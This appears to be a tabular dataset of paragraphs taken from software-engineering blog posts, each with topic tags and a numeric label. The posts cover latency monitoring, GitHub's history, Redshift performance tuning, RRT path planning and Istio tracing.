237,"In the recent decade, our systems got complex. Our average production environments consist of many different services (many microservices, storage systems and more) with different deployment and production-maintenance cycles. In most cases, each service is built and maintained by a different teamsometimes by a different company. Teams dont have much insight into others services. The final glue that puts everything together is often a staging environment or sometimes the production itself! Measuring latency and being able to react to latency issues are getting equally complex as our systems got more complex. This article will help you how to navigate yourself at a latency problem and what you need to put in place to effectively do so.","['Microservices', 'Observability', 'Monitoring']",10
238,"Latency is how long it takes to do something. How long does it take to have a response back? How long does it take to process a message in a queue? We use latency as one of the core measures to tell whether a system is working as intended end-to-end. On the critical path (in the lifetime of a user request), latency is the core element that contributes to the overall user experience. It also allows us whether we are utilizing our resources as expected or our throughput is less than our trajectory.","['Microservices', 'Observability', 'Monitoring']",11
239,"Even if you are not engaging with latency measurement, you might be already familiar with various tools on a daily basis that reports latency results. As a daily example, various browser developer tools report the time it takes to make all the requests that make up a web page and report the total time: Latency is a critical element in the SLOs we set between services. Each team set an SLO for their service (e.g. 50th percentile latency can be 20ms, 90th percentile latency can be 80ms, 99th percentile can be 300ms) and monitor their latency to see if there are any SLO violations. (Watch SLIs, SLOs, SLAs, oh my! )But how do we systematically collect and analyze request latency in todays production systems? We measure latency for each request and primarily use metric collection systems to visualize and trigger auto alerts. Latency collection is unsampled (we collect a latency metric for every request) and is aggregated as a histogram distribution to provide visibility to the higher percentiles.","['Microservices', 'Observability', 'Monitoring']",11
240,"Get Emails call, 99th percentile request latency should be less than 300ms. is an example SLO where we set the 99th percentile upper bound for latency for the inbox services Get Emails method. There might be requests that took more than 300ms but would not violate the SLO if there are not making to the 99th percentile. You can define your SLOs in a lower or higher percentile. (Watch How NOT to Measure Latency to understand why percentiles matter. )When an SLO violation occurs, we can automatically trigger alerts and ping the on-call person to take a look. Or you can hear from a customer that they are expecting poor latency and ask you to resolve the issue.","['Microservices', 'Observability', 'Monitoring']",11
241,"Often, servers are handling a large number of requests and there is no easy way to isolate events happened in the lifetime of a request. Some language runtimes like Go allows us to internally trace runtime events in the lifetime of a request. Tools like runtime tracers are often very expensive and we momentarily enable them in production if we are trying to diagnose a problem. We momentarily enable collection, try to replicate the latency issue. We can see if latency is caused by I/O, blocking or stopping-the-world events triggered by the runtime. If not, we can rule out those possibilities.","['Microservices', 'Observability', 'Monitoring']",3
242,"One of the most frequent difficulties in software development is task estimation. We could find many reasons of this fact but, in our opinion, the main one is that everyone lies to each other. Developers multiply the estimate, which seems to them real, by three. Managers then double it on top. And later their leadership will increase the estimates three times, as well as the stakeholders wont much hope to meet the deadlines.","['Software Development', 'Project Management', 'Programming', 'Tech', 'Teamwork']",1
243,"What is your position regarding the evaluation of the program code in your team? Do you support a regular code review or are you limited to the fact that it works as expected? Summarizing best practices in software development, we notice that all of them pay a great attention to the code cleanliness. But how to understand whether the program is good enough? In routine everyday development process it becomes a great challenge to determine how good the code, which is currently being written, is. And this is not because the developer is not smart enough for this code. The simple fact is that the created code for the developer is, by definition, already the best one, otherwise he wouldnt come up with it. Usually the rhetoric of adding crutches to the code base operates with concepts there may be some not very beautiful parts of the code, but you just can not write here in another way, and the consequences of such arguments we all know well.","['Software Development', 'Project Management', 'Programming', 'Tech', 'Teamwork']",13
244,"Indeed, when its asked about the consistency of the combat comrade, the criteria can differ a lot, and each of these criteria vary depending on the advantages and experience got. For someone it is important whether the partner shoots well and runs fast. Another one is looking for somebody who is silent and cooks tasty. And the third one needs a person who isnt afraid of snakes and is able to control a combat helicopter. Trying to create any more or less universal list of required qualities and properties of a fighter, we very soon skip to the listing of characteristics of some kind of RPG like Fallout or Skyrim. And it will be extremely difficult to distinguish a good fighter from a bad one.","['Software Development', 'Project Management', 'Programming', 'Tech', 'Teamwork']",12
245,"Its 1964, Kennedy was shot, the Vietnam War is on its way, and FORTRAN is becoming a popular programming language. You are tasked with making a program to calculate a mathematical equation. You dont go for your keyboard, but instead for a pencil. You take a piece of paper, and meticulously write your code, one symbol at a time, inside little rectangles in the paper. The paper, meanwhile, doesnt report any errors. It has no debugger or breakpoints.","['Programming', 'Computer Science', 'Engineering', 'Software Development', 'Mobile App Development']",5
246,"You take that paper, hoping there are no typos, (or rather, writeos) and start punching holes in a card, where each hole corresponds to a symbol on that piece of paper. Again hoping you didnt make a mistake, you take the punch card and you put it inside a computer. The computer reads the card, compiles the program and outputs a little printout, kind of like a receipt in a store. You take the printout, you read it, and you see that its an error. With a sigh, you waddle back to the piece of paper, write in the closing brace, punch in a new card and repeat.","['Programming', 'Computer Science', 'Engineering', 'Software Development', 'Mobile App Development']",5
247,"So far this is pretty obvious. Not all problems are equally complex. But think of the examples above. They are solutions to the same problem (with the same essential complexity) but the difficulty of the actual soltions differs in a few orders of magnitude. The reason is that not all complexity is essential. While some complexity is inherent to the problem, we also bring our own complexity while writing the program.","['Programming', 'Computer Science', 'Engineering', 'Software Development', 'Mobile App Development']",9
248,"You may discover a 3rd party library that needs to be updated. For example, someone discovered the current version of Sql Delight required an old version of the Room persistence library. They requested an update, and Square has already provided the updated version of the lib. If you discover an issue, the sooner you can request an update from the developer the better. The newest version of Room (v2.1) already requires Android X, which likely will cause many folks to upgrade. As of this writing, the Facebook SDK is not updated, and this likely will be a blocker for many people.","['Android App Development', 'Jetpack', 'Appcompat', 'Kotlin', 'Android']",18
249,"The best way to save time while solving problems is to use the right tool for the job. Every one of those hammers in that image has a distinct purpose. If you ask the masternicelyhe just might explain the tools. There are more and more tools now, the ecosystem truly is huge. Lots more then when I began my journey of writing code. It is mind-boggling to try and keep up with everything.","['Software Engineering', 'Data Modeling']",9
250,"The biggest problems Ive had during this journey is when I use the wrong tool for the job. Im still able to get the job done, and solve the problem. But, around half-way through I get a nagging thought: There must be a better way. Youre writing code that works against the grain of your tool. Here is a classic example that has bitten me so often: tracking historical changes in a relational database. Relational databases are the wrong tool for this job. Because their strength is keeping the current state normalized, not what has changed along the way. Depending on what youre tracking, the right tool may be a time series DB, or it may be a document store (you always hated locking your tables with ALTERs didnt you?","['Software Engineering', 'Data Modeling']",8
251,That is why there are so many good tools now. The generation of software engineers before me realized they were using the wrong tool. They went out and built the right one. There are lots of different problems that people are trying to solve. That is why there are so many tools. Figuring out what each of them is good at is now part of our job.,"['Software Engineering', 'Data Modeling']",12
252,"Youre under pressure to design a system. Your shop isnt truly Agile; rigid deadlines are everywhere. The Vice President of Software Engineering is breathing down your Managers neck: What do you do, you meager Engineer? Youve managed to scrounge together a proof of concept (POC) in cadence with expectations; however, the source code is just that: a proof of concept. Under load, the code quality might burn down a server farm.","['Software Development', 'Programming', 'Software Engineering', 'Code']",13
253,"A. Beladay and M. M. Lehman (mentioned above) published a paper seeking to apply the scientific method to [reveal] the nature of the software world, specifically applying what they termed a structured analysis. Beladay and Lehman identified and evaluated a series of independent variables in IDMs os/360 development life cycle (p. 227): Both authors discovered that as time continued, quantifiable problems grew deeper. Worse, the problems appeared to deepen exponentially.","['Software Development', 'Programming', 'Software Engineering', 'Code']",5
254,"The causes for this are multivariate. Beladay and Lehman seem to allude to the fact some factors contributing to the First Law are beyond engineer control, e.g. Id caution anyone to use that as an excuse; rather the question we should ask is: what can we do to mitigate the factors to which we quantifiably do contribute (again, Ill address this in a follow up essay)? Law of Increasing Entropy The Second Law, sometimes referred to as the Law of increasing complexity, states (p 228; parenthetical remarks original): This law is relatively self-explanatory: as time continues, the complexity of a system increases. Extrapolating a bit: if Continuing Change is the inevitably of re-spending a dollar, unmitigated Entropy is the liability to increase the number of dollars spent, i.e. the increase in the number of things that must be maintained.","['Software Development', 'Programming', 'Software Engineering', 'Code']",5
255,"A natural question is: why should I care? would go on to define a series of categories to which a system (program) might belong. Lehman then defined which laws applied to those system categories. The first three laws described above are applicable to E-Type systems. In a 1980 paper, Lehman described E-type systems as (grabbing a summary from Wikipedia): E-type systems are most likely the systems with which you are working as an Engineer: a banking application, an insurance application, an application for sharing documentsthe list is quite possibly endless. We are typically in the world of mapping solutions to real-world activities.","['Software Development', 'Programming', 'Software Engineering', 'Code']",16
256,"However, even the simple act of upgrading to the latest version opens the door to more risk on your production environment: Breaking changes. Some open source projects change extremely quickly and can move through non-backwards compatible version with regularity. If these are properly communicated, youll need to do the work to support them. This is especially hard with storage systems. And, even worse, sometimes there are breaking changes that arent so well communicated, and you only notice when your own application breaks! These are typically a pain to track down. You may notice that your application is getting slower or buggier with time, only for the problem to ultimately lie within code that you havent written yourself. The code of open source systems isnt necessarily the first place youd look, either. Surely someone else has thoroughly tested it, right? Unknown maturity of a subset of features. You may eagerly upgrade to the latest version of a database because new functionality has been released that you are eager to use, only for you to find out that it hasnt been tested extensively at scale. We struggled with the maturity of Solr being able to store indexes in HDFS to the point that we gave up and returned to local storage on SSDs. This took many weeks of testing to prove otherwise.","['Open Source', 'Software Development', 'SaaS', 'Software Engineering', 'Software Architecture']",13
257,"You can also decide how you roll out updates of the system when they are released upstream. When you create a new build, how long should you allow it to run on your testing or staging environment before allowing it to go live? How can you maximize your chances of experiencing any unexpected behavior or broken functionality before it hits production? Should you write your own integration tests to prove that the new build still works with your own application in the way you expect? If youre depending on a technology in production at scale, its likely youll experience a few bugs. Building from source allows you to isolate them and fix them fast. Rather than an upstream bug causing panic while you wait for the project to push out an official patch, if your system is broken then you can patch the source yourself, build it, and release it locally for use immediately whilst waiting for the rollout of official patches upstream. If you fix it first, then youve just contributed to the project.","['Open Source', 'Software Development', 'SaaS', 'Software Engineering', 'Software Architecture']",13
258,"The pragmatic reader will have realized. clearly, that you dont want to build all of your dependencies from source. As mentioned previously, at Brandwatch we build two storage technologies from source: Solr and HBase. Our decision to do this was guided by the following principles: They are our primary storage systems. Our core competencies are in data enrichment, storage and analysis. These systems enable a lot of that functionality.","['Open Source', 'Software Development', 'SaaS', 'Software Engineering', 'Software Architecture']",8
259,"For complex backlog items: dont pull in. Run safe to fail experiments, conduct feasibility analysis or explore possibilities. If you use spikes for this, keep in mind that they should be demonstrable at the end of the sprint and used with caution because they dont deliver value from the users perspective. A side note: if we pull in unexplored backlog items, this is forced innovation leading to chaotic domain. Maybe dangerous, maybe with unintended consequences, but with huge value if we want to trigger innovation under stressful situations.","['Agile', 'Cynefin Framework', 'Software Estimation', 'Noestimates', 'Product Backlog']",13
260,"Inventing an entirely new OS might have been enough for some people, but not Torvalds. In 2005, Torvalds unveiled his latest projecta new version control system called Git. Version control is crucial to the concept of collaborative programming. Version control systems track changes to computer files over time. Similar to the snapshots that computer backup systems use as restore points, version control systems allow programmers to work on the same project without stepping on each others changes by tracking each version of a project by forking or separating versions of that project into distinct branches. Once changes have been made to a branch, they can be uploaded back to and merged with the original project, in a process known as a commit. This system allows programmers to work independently on their own branches before merging their files back to the main project, which is known as a repository.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
261,"Prior to the invention of Git, programmers who wanted to collaborate with other coders had few options. There was Subversion, an open-source version control system. Subversion was and is popular, but Subversions shortcomings werent unique to Subversion or any other specific version control system. They were inherent to the concept of collaborative programming at that time. Even using Subversion, working with an open-source team was often a matter of gaining permission from a project administrator to fork a branch of a project rather than working on the code itself. In many cases, this approval process took longer than it did to write the code. Many open-source projects were beset by permissions issues, gatekeeping, and other inefficiencies.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
262,"When Git was released in 2005, open-source was experiencing something of a renaissance. Interest in and adoption of Linux was strong. The first of the Web 2.0 applications had begun to emerge. Many companies were migrating their tech stacks to open-source servers. Although Git made collaborating on open-source projects practically effortless by introducing the concept of forking, there was something Git couldnt do: help coders find those open-source projects. A lot of programmers were working on plenty of exciting open-source projects, but finding them was difficult.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
263,"Git attempted to address some of these problems. Linus Torvaldss version control system was as remarkable as the operating system he had built single-handedly just a few years before. Git allowed coders to collaborate without petitioning gatekeepers for access. Git was a crucial first step in the ultimate democratization of coding, particularly in the open-source community. But for all the ease Git promised, it lacked collaborative tools, and sharing code between two programmers was still clunky and difficult. It might be hard to imagine now, but picture software developers emailing patches back and forth and it becomes easier to see why Git Hub was so sorely needed.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
264,"In January 2008, after three months of weekend-long code sprints, napkin wireframes, and bleary-eyed all-nighters, Wanstrath and Preston-Werner were ready to unveil Git Hub to the world. Just as Spotify did during its crucial early-development stages, Git Hub first launched as a private beta. Wanstrath and Preston-Werner emailed their friends at startups across the Bay Area and beyond, inviting them to try the tool theyd been building. The response was immediately and powerfully positive. The following month, Git Hub, Inc. was officially founded as a company, after changing its name from Logical Awesome.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",10
265,"The markets urgent need for a product like Git Hub and the stickiness of the product itself were not the only factors in Git Hubs rapid early growth. The social aspect of Git Hub was also a powerful driver of growth. Before Git Hub, programmers had few ways to prove their programming chops, beyond answering whiteboard hypotheticals in technical interviews. Now, coders could publicly host their projects codebases, actually show prospective employers their code, and get involved in the wider software development community, all in one place. Git Hub didnt just benefit individual programmers, either. Recruiters could browse public repositories and user profiles to identify prospective hires and see what kind of projects applicants had been working on, making Git Hub a valuable recruitment tool.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",10
266,"By 2012, Git Hub had become incredibly popular. For many programmers, the question wasnt whether they used Git Hub, but what they used it for. Not only had Git Hub steadily attracted a strong user base with virtually no advertising, promotion, or venture capital funding, but it had also grown the number of corporate teams using Git Hub to host private repositories of proprietary code. What Git Hub needed to do now was scale revenue by penetrating further into the enterprise. The first thing Git Hub did to accomplish this was hire Brian Doll, who became Git Hubs VP of Marketing and Strategy in February 2012. The second was raise $100M as part of its Series A round led by Andreessen Horowitz.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",10
267,"By 2012, Git Hub had grown impressively. The company had created a solid product that solved urgent problems and had built an entire company around an emerging technology. But it became evident that Git Hubs bootstrapped approach to growth could only take them so far. To maintain the impressive momentum the company had established and realize its bolder ambitions, it needed capital. It got this capital from Andreessen Horowitz, which was the sole investor in Git Hubs Series A round of $100M in July 2012. Git Hub would use this funding to hire additional engineering talent and develop new products.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",10
268,"Its important to note that although Git Hub had been entirely bootstrapped prior to Andreessen Horowitzs Series A round, this was not a matter of conflicting ideologies. Some people believed that Git Hubs origins in the open-source community put the company at odds with the proprietary walled-garden approach favored by investors. Git Hub didnt refuse VC funding out of principle; it refused VC funding because it didnt need it. By the time Git Hub began looking for external investment, the product was already clearly defined with a large user base. Best of all, Git Hub had been profitable practically since Day 1. This freedom allowed Git Hub to intentionally shape not only its product but also the culture of the entire organization, completely free of investor influence.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
269,"This appeal reached far beyond open-source hobbyists and script kids hacking in their bedrooms. It was also powerfully attractive to large corporate interests. By 2013, most of the Valleys biggest tech companies were using Git Hub, from tiny skunkworks projects to major proprietary systems. Adobe, Dropbox, Facebook, Google, Twitterthey all had private repositories on Git Hub. Some firms, such as Mozilla, had several hundred repos and hosted virtually everything on Git Hub. Others, such as Facebook, had far fewer repositories (just 102 compared to Mozillas 687) but significantly higher engagement, with more than 15,000 forks across Facebooks 102 repositories.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
270,"Of course, the bigger you are, the bigger a target you become. On March 28, 2015, Git Hub endured the largest cyberattack it had experienced since launch. The attacka standard distributed denial of service attack, or DDo Swas believed to have originated in China. But the attack was not an attempt to cripple an American company for the benefit of an Asian competitor. Instead, the attack was allegedly aimed at just two Git Hub projects. The first was Great Fire, an organization that works to help Chinese internet users circumvent the countrys so-called Great Firewall of China. The second was the Git Hub page for a Chinese mirror of The New York Timess website, which also helps Chinese users access the newspaper from behind Chinas sprawling surveillance apparatus. Although the attack was ultimately thwarted, it highlighted the dangers of hosting so much of the worlds code in one placeparticularly code intended to subvert state surveillance apparatus.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
271,"However, although Git Hub was still growingat a rate of 10,000 new users per workday by September 2015the pace of that growth was slowing. Git Hub was facing heightened competition from both Bitbucket and Git Lab, and user growth suffered as a result. Revenue, on the other hand, was increasing rapidly. In September 2015, Git Hubs annual recurring revenue (ARR) was approximately $90M. By August 2016, that figure had risen to $140M. In the 23-month period from September 2014 to August 2016, revenue from Git Hubs personal plans had stagnatedbut revenue from its Organization plans had almost doubled. Revenues from Git Hub Enterprise had tripled. In September 2014, around 35% of Git Hubs ARR came from Git Hub Enterprise. By August 2016, Git Hub Enterprise made up half of Git Hubs ARR.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",10
272,"Within hours, Hacker News, Reddit, and Tech Dirt were awash with angry users who felt betrayed by Git Hubs acquisition. Many people pledged to leave Git Hub in protest. Some users posted that they were already in the process of migrating their repositories from Git Hub to competing services Git Lab or Bitbucket. People made nervous jokes about the security of their code. Others cracked wise about how Clippy would soon be helping developers deploy their projects to Azure. Still others drew parallels between the deal and Oracles acquisition of My SQL when it bought Sun Microsystems in 2009.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",16
273,"If youre not using your own product, why not? Is there a problem with your product, or are you not personally affected by the problem your product claims to solve? Both of these scenarios are serious problems. Not using your own product internally raises questions of whether theres a genuine need for your product. If youre not personally experiencing the problem your product solves, what makes you the right company to solve it? Part of what drove such incredible growth for Git Hub was the companys relentless focus on solving not only big, ambitious problems, but also painful problems that all software developers experience. This created an enormous potential user base for Git Hub and allowed the company to fundamentally reshape software development as we know it.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",12
274,"Think about your product and its place in the broader vertical your company operates in, then ask yourself: If you could somehow add a brand-new feature or function to your existing product, what would that feature be, and what problem would it solve? Why isnt this feature already in your product, or in development? How could you overcome these obstacles to implement this feature? What makes the problem youre trying to solve so painful? Is it a technical problem or a human problem? Git Hub succeeded because it solved a technical problemthe need for a better, more intuitive version control systemthat had significant potential to solve a human problem, namely collaborating on software projects easily, securely, and remotely. Focusing on the technical problem also allowed Git Hub to solve a human problem, which was an immensely important factor in Git Hubs success.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",12
275,"Take a look around your company, and think about the following questions: How does your companys culture reflect your organizations values? Even in the early days, Git Hub took great delight in poking fun at traditional notions of corporate success, from their relatively flat hierarchical structure to the faux-wood paneling and brandy decanters in the companys mock boardroom. What values and brand attributes does your companys culture say about you? To what extent do your employees shape your companys culture? Put another way, how much of your companys identity is dictated from the top down, and how much has emerged organically over time as a result of the hires youve made? How do you think your competitors perceive your company and your product? How much of this perception would be based on the culture of your organization? Git Hub achieved incredible success by doing two things: identifying a huge, painful problem to solve; and creating a popular, sticky product that made it easier for people to work together and share code. The biggest challenge facing Git Hub now is to devise a way to further ingratiate itself into coding as a technical discipline while simultaneously appealing to professionals beyond software developers.","['Open Source', 'Github', 'Product Management', 'Development', 'Programming']",0
276,"I decided to use this opportunity to expand my meager Python skills and have created a simple app that does very little other than randomly generating logging messages. Specifically, it outputs a simple colon-delimited message that looks like this (as shown in the default Stackdriver Logging viewer without any modifications):or The actual message that I care about has two partsthe part before and after the colon. Specifically, I would like to know whether there is a difference in values for errors and warnings! Ideally, I just want to send all the logs to Big Query and do my analysis therebut the entire payload is in a single field called text Payload, and my string parsing skills in SQL dont exist. Well, thankfully, Stackdriver has recently started supporting structured logging, and you can read all about it here. Theres another blog post that does a great job of describing the overall value of structured logging, too. For our purposes herewe want to use structured logging to break up a single line into multiple fields using regular expressions. The bad newsthe existing instructions are only for the logging agent running on virtual machines. Lets see if we can make this work on Kubernetes?0Set up cluster and deploy (new) logging Deploying Stackdriver logging on a GKE cluster is easy and well documented here. I wont rehash the instructions here, but I followed them precisely, and I suggest you do the same. Im going to assume that you have created your cluster and set up your kubectl context and credentials from this point on.1Deploy the application Now that we have a cluster, we need something running on it to generate the logs of the kind Im discussing here. Ive made my (please dont judge me too harshly) code available on Git Hub. Lets deploy it to our cluster.","['Kubernetes', 'Stackdriver', 'Logging', 'Fluentd']",15
277,"Unlike most path planning algorithms, there are two main challenges that are imposed by this problem. First, the robot does not have existing nodes to travel between. If one considers the famous Dijkstras algorithm, that problem includes a graph. With a free continuous space, a graph of edges and vertices needs to be created. This fosters questions on the characteristics a graph should have for such a problem. Secondly, one must determine how a shortest path will be determined. The problem of building a graph and navigating are not necessarily solved by the same algorithm.","['Robotics', 'Computer Science', 'Programming', 'Python', 'Algorithms']",14
278,"There exist numerous path planning algorithms that address the navigation problem. Rapidly-exploring random trees (RRT) is a common option that both creates a graph and finds a path. The path will not necessarily be optimal. RRT*, popularized by Dr. Karaman and Dr. Frazzoli, is an optimized modified algorithm that aims to achieve a shortest path, whether by distance or other metrics. Both are implemented in python and observed in this article. To demonstrate the idea, the algorithms will be implemented in a 2D space with bounds. However, both algorithms can be built into any real continuous dimensional space. A video demonstration of these algorithms, as well as additional algorithms, is at the end of this article.","['Robotics', 'Computer Science', 'Programming', 'Python', 'Algorithms']",14
279,"This is expected as nodes are attached to their nearest neighbor. The structural nature of these graphs hinders the probability of finding an optimal path. Instead of taking the hypotenuse between two points, the two legs of a triangle are navigated across. This is evidently a longer distance. The cubic nature and irregular paths generated by RRT are addressed by RRT*.","['Robotics', 'Computer Science', 'Programming', 'Python', 'Algorithms']",14
280,"First, RRT* records the distance each vertex has traveled relative to its parent vertex. This is referred to as the cost()of the vertex. After the closest node is found in the graph, a neighborhood of vertices in a fixed radius from the new node are examined. If a node with a cheaper cost() than the proximal node is found, the cheaper node replaces the proximal node. The effect of this feature can be seen with the addition of fan shaped twigs in the tree structure. The cubic structure of RRT is eliminated.","['Robotics', 'Computer Science', 'Programming', 'Python', 'Algorithms']",14
281,"Beginnings: From My SQL to Redshift We launched our first Redshift cluster in May 2014. It was modest: only two nodes (dw1.xlarge). Prior to Redshift, all of our analytics workflows were processed in our production My SQL databases. This was a problem for numerous reasons, the most concerning being that a bad query could negatively impact site performance or, worst-case, bring the site down. Migrating the analytics workflows from My SQL to Redshift provided us with a scalable data warehouse that we could use for data ingestion and processing without disrupting our production systems. We also started using it to back our Chartio dashboards. This was a dynamic time at Udemy. Growth was accelerating, ETL pipelines and dashboards were proliferating, and our internal users of Redshift numbered in the hundreds.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
282,"The benefit of having data stored in columns is two-fold. First, columnar stores provide better compression than row-based stores. Since all columns are stored as a single data type, we can use type-specific algorithms for increasing compression ratios. Similarly, additional optimizations such as tokenization can be applied to empty or repeating data to reduce the number of bytes stored. This is particularly effective when the data in the column is sorted. Additionally, columnar stores provide the ability to retrieve only those columns were seeking. The increased efficiency in both storing and retrieving our data is ideal for the larger datasets common to analytics processing.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
283,"The concept is simple: for optimal performance you must ensure your queries are executing evenly across all nodes in the cluster. Redshift provides three different styles for distributing your data: EVEN, ALL, and KEY. EVEN distribution leverages a round-robin algorithm for distributing your data evenly. ALL distribution copies the entirety of the table to every node in the cluster. If you dont explicitly select a style in your table schema, Redshift will default to ALL or EVEN, depending on the size of the data. KEY distribution uses a hash function applied to the key for determining which node to write the data.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
284,"Optimized compression, parallelism, and efficient data IO are central to Redshift performance, but all are for naught if your data isnt sorted. We briefly touched on sort and its impact on compression above, but lets take a closer look at the importance of sorted data. These blocks are composed of data sorted by the key(s) configured in the table schema and are written to disk contiguously. Redshift also provides a secondary data structure called a zone map that maps ranges of sort-key values to their physical location on the cluster. If the data on the cluster is sorted, Redshift can leverage the zone maps to quickly and efficiently locate your data. If the sort is corrupted, your queries result in degraded performance due to inefficient block scans.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
285,"Redshift provides two types of keys to help sort your data: compound and interleaved. Compound sort keys are composed of one or more columns and are the most commonly used type in our cluster. If you require multiple columns in your key, make sure to list them in ascending order based on cardinality. If your primary key already has high cardinality, subsequent keys will have little impact on query performance. Similarly, compound sorting provides little benefit when primary sort keys arent included in the filter. Interleaved keys are provided to help with the limitations of compound keys. They are designed to weigh each column in the key evenly, allowing improved performance regardless of which columns in the key youre filtering. Our advice is to proceed with caution. Query performance degrades significantly as you filter fewer of the columns in your key. You may be doing yourself a disservice by not using a compound key, especially if the majority of your queries filter only on the prefix of the sort key. If youre not sure which key type is best, test both.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
286,"Maintaining Table Hygiene Okay, now your data is stored efficiently. Its sorted, compressed, and distributed evenly across all nodes in the cluster. How are you going to keep it that way? If you dont routinely service your tables, entropy will insidiously sneak in and render your cluster useless.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
287,"Due to the nature of our business, we perform a lot of updates on our data. In Redshift, updates are performed by a combination of INSERT and DELETE statements. The DELETE statements dont actually delete the data but instead mark it for future deletion. These ghost rows arent removed until a vacuum delete-only operation is run (automated delete-only vacuuming coming soon). This ghost data compromises your query performance by scanning rows that will never be returned in your results. Routinely removing this cruft from your cluster is a good first step toward maintaining proper table hygiene and improved performance.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
288,"Unless certain conditions are met (see Loading Your Data in Sort Key Order), sort order degrades any time a DML operation is executed on the table. Maintaining sorted data is not trivial, but Redshift provides you with vacuum commands for this. Vacuum operations are expensive, increasingly so as you use more exotic keys. Making matters worse, Redshift doesnt support running parallel vacuum operations. In short, the fewer columns you use in your key, the easier it is to maintain the sort. For interleaved keys, keep in mind that the performance benefits increase with the size of the table, but the associated vacuum operations for these keys are extremely expensive and near-impossible to execute on very large tables.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
289,"Concurrency, Our Last Hurdle Even with optimal table hygiene you can still suffer from poor performance. In early 2017, we started to see an uptick in timeouts and slow-loading dashboards. Our table hygiene was pristine, so what gives? We knew the data growth was considerable. We were also processing over 500 ETL jobs per day. In March we decided to expand the cluster to 16 nodes. After the expansion, the expected bump in performance never materialized.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",10
290,"We identified concurrency as the issue. We noticed that Chartio was issuing 100 queries at a time. We immediately lowered this to 25 queries and that helped but not nearly enough. We discussed the issue with the Redshift team. Their only recommendation was to use Spectrum. We also tried leveraging query monitoring rules to no avail. We knew we had to optimize our queue configuration, we just didnt know how. It was clear to us that we needed better instrumentation of our data platformsomething that could give us visibility across our ETL jobs, Redshift cluster and dashboards, ideally in one place. Thats when we came across intermix.io, a product that provides performance insights for data.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
291,"Providing Better Tooling for our Data Team We started using __url__ in May of 2017. __url__ is a real-time analytics platform that collects metrics from your data infrastructure and transforms them into actionable insights about your data pipelines, apps, and users who touch your data. After instrumenting our cluster, we determined it was under-resourced, regardless of the known concurrency bottleneck. We immediately added six nodes, increasing the cluster size to 22. This helped but queries were still spending considerable time in queue. Concurrency issues with Redshift are difficult. You can isolate resources (memory, concurrency) on a per-queue basis, but in the end its a zero sum game. Any resources allocated to one queue negate them from being available to the others. You need a strategy that optimizes throughput and ideally allows you to prioritize queries. Thankfully, we had intermix to help us understand the strategy and techniques needed to achieve both. Heres what we learned: How to Solve Redshift Concurrency Bottlenecks At some point, you will most likely need to adjust your queue configuration to get the most out of your cluster. intermix provides a great article for explaining the details of queue configuration.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",11
292,"Create separate queues, each with its own purpose and performance characteristics. Its helpful to think of your queues as serving a specific purpose: data ingress/egress, transformations, and ad hoc usage. Tailor the concurrency and memory settings of the queues to suit their purpose. The load queue has lower memory and concurrency settings and is specifically for COPY/UNLOAD operations. We also created a transform queue with the highest memory allocation to better facilitate update operations. Finally, we created an ad hoc queue with less memory allocated but higher concurrency to meet the higher volume of queries.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",8
293,"Whats Next In Your Redshift Story? We hope youve found this post helpful, and if it enables you to side-step some of the issues weve faced, even better. Redshift can quickly and easily empower your organization with scalable processing power and is a logical first addition to your Big Data toolbelt. Its a powerful tool when you know how to use it effectively. But Redshift isnt going to solve all of your processing needs. Eventually youll want decoupled storage and compute along with autoscaling. Were solving these problems at Udemy now. Stay tuned here for the lowdown.","['Big Data', 'Data Warehouse', 'Amazon Redshift', 'Redshift', 'Data']",6
294,"In fact, what is relatively easily is only a diagram of our systems nodes connected by arrows and the data rate between services (in fact, only bytes per unit of time). However, in most situations, the services communicate over some application layer protocol, such as HTTP, g RPC, Redis, etc. And, of course, we want to see the tracing information of these protocols, we want to see the rate of application level requests and not the rate of data. Further, we want to know the protocols request latency. Finally, we want to see the full path made by the request from the moment the user enters to the moment the response was received. Unfortunately, this is not an easy task.","['Docker', 'Kubernetes', 'Istio', 'Distributed Tracing', 'Observability']",11
295,"First, lets examine how sending tracing spans look from an architectural perspective in Istio. As I mentioned in the previous blog post, Istio has a dedicated component for collecting telemetry called Mixer. However, in the current version 1.1. *, tracing spans are sent directly from proxy servers, namely, from envoy proxies. An envoy proxy supports sending tracing spans using the zipkin protocol out of the box. Other protocols require a plugin to be connected. Istio comes with a precompiled and preconfigured envoy proxy, supporting only the zipkin protocol. If we want to use, for example, the Jaeger protocol and send tracing spans via UDP, we need to build a custom istio-proxy image. Istio-proxy does support custom plugins, however, it is still in the alpha version. Therefore, if we want to avoid multiple custom settings, the range of solutions that can be used for receiving and storing tracing spans is limited. Of the most popular protocols, either Zipkin or Jaeger can be used, but in the latter case, everything has to be uploaded using a zipkin-compatible protocol (which is much less efficient). The zipkin protocol sends all the tracing information to the collectors via the HTTP protocol, which is far from cost-effective.","['Docker', 'Kubernetes', 'Istio', 'Distributed Tracing', 'Observability']",11
